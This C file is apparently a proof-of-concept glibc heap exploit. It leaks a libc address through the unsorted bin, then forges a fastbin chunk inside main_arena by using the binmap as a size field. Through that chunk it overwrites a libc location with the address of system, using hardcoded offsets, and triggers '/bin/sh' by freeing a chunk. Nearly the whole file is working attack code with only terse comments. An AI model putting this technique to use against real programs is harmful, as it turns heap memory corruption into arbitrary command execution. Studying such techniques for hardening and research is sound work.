#include <stdio.h>
#include <stdlib.h>

int main(){

    setbuf(stdout, NULL);

    // first, leaking unsorted bin address

	void *ptrs[8];
	for (int i=0; i<7; i++) 
		ptrs[i] = calloc(1, 0x8);
	for (int i=0; i<7; i++) 
		free(ptrs[i]);

    for (int i=0; i<7; i++) 
		ptrs[i] = calloc(1, 0x30);
	for (int i=0; i<7; i++) 
		free(ptrs[i]);

    for (int i=0; i<7; i++) 
		ptrs[i] = calloc(1, 0x40);
	for (int i=0; i<7; i++) 
		free(ptrs[i]);

    unsigned long * fch0 = calloc(1, 0x8);
    unsigned long * fch1 = calloc(1, 0x8);
    unsigned long * fch2 = calloc(1, 0x8);
    unsigned long * fch3 = calloc(1, 0x8);

    fch0[3] = 0x41;
    free(fch1);

    unsigned long * fch1_snd = calloc(1, 0x30);

    fch1_snd[3] = 0x21;
    free(fch2);

    unsigned long * trigger_move_to_ubin = calloc(1, 0x400);

    unsigned long unsorted_bin_addr = fch1_snd[4];

    if(fch1_snd[4] == 0)
        perror("unsorted bin addr not leaked");
    if(fch1_snd[4] != fch1_snd[5])
        perror("unsorted bin addr not leaked");

    unsigned long libc_base_addr = unsorted_bin_addr - 0x1ebbf0;

    //fch2 = calloc(1, 0x40);

    // then, forging a fastchunk of total size 0x50 (requested 0x40)
    // inside the main_arena struct

    unsigned long * forger = calloc(1, 0x40);
    unsigned long * delivery = calloc(1, 0x40);
    unsigned long * guard0 = calloc(1, 0x40);

    //unsigned long * ch_binmap_sndbyte_0x1 = calloc(1, 0x410);
    //unsigned long * guard1 = calloc(1, 0x40);
    unsigned long * ch_binmap_sndbyte_0x16 = calloc(1, 0x500);
    unsigned long * guard2 = calloc(1, 0x40);
    unsigned long * ch_binmap_sndbyte_0x40 = calloc(1, 0x580);
    unsigned long * guard3 = calloc(1, 0x40);

    // together, after freeing, the bitmap will have second byte 
    // set to 0x51 - a valid field for a fastbin of requested size 0x40, with prev inuse set

    //free(ch_binmap_sndbyte_0x1);
    free(ch_binmap_sndbyte_0x16);
    free(ch_binmap_sndbyte_0x40);

    unsigned long * trigger_move_to_bin = calloc(1, 0x800);
   
    /*printf("forger = %lx, delivery = %lx, guard0 = %lx\n \
, ch_binmap_sndbyte_0x1 = %lx, guard1 = %lx,\n\
ch_binmap_sndbyte_0x50 = %lx, guard2 = %lx, trigger_move_to_bin = %lx\n", forger, delivery, guard0, ch_binmap_sndbyte_0x1, \
                                                                        guard1, ch_binmap_sndbyte_0x40, guard2, \
                                                                        trigger_move_to_bin);
    */
    // allocating fastchunk inside main_arena struct
    // with binmap as the size field

    unsigned long binmap_fastchunk_ubin_offset = 2032;

    free(delivery);
    forger[10] = unsorted_bin_addr + binmap_fastchunk_ubin_offset;

    delivery = calloc(1, 0x40);
    unsigned long * binmap_forged_chunk = calloc(1, 0x40);

    printf("libc base = %lx, binmap_forged_chunk = %lx\n", libc_base_addr, binmap_forged_chunk);

    unsigned long EXIT_OFFSET = 0x49bc0;
    unsigned long PUTS_OFFSET = 0x875a0;
    unsigned long SYSTEM_OFFSET = 0x55410;

    printf("%lx\n", unsorted_bin_addr);
    for(int i = 0; i < 0x2738 / 8; i++)
        ((unsigned long *)binmap_forged_chunk)[i] = 0;
    ((unsigned long *)binmap_forged_chunk)[0x2738 / 8] = libc_base_addr + SYSTEM_OFFSET;

    puts("aici");
    //printf("aici2");

    ((char*)delivery)[0] = '/';
    ((char*)delivery)[1] = 'b';
    ((char*)delivery)[2] = 'i';
    ((char*)delivery)[3] = 'n';
    ((char*)delivery)[4] = '/';
    ((char*)delivery)[5] = 's';
    ((char*)delivery)[6] = 'h';
    ((char*)delivery)[7] = '\x00';

    /*((char*)delivery)[0] = 't';
    ((char*)delivery)[1] = 'o';
    ((char*)delivery)[2] = 'u';
    ((char*)delivery)[3] = 'c';
    ((char*)delivery)[4] = 'h';
    ((char*)delivery)[5] = ' ';
    ((char*)delivery)[6] = 'p';
    ((char*)delivery)[7] = '\x00';*/
    free(delivery);

    return 0;
}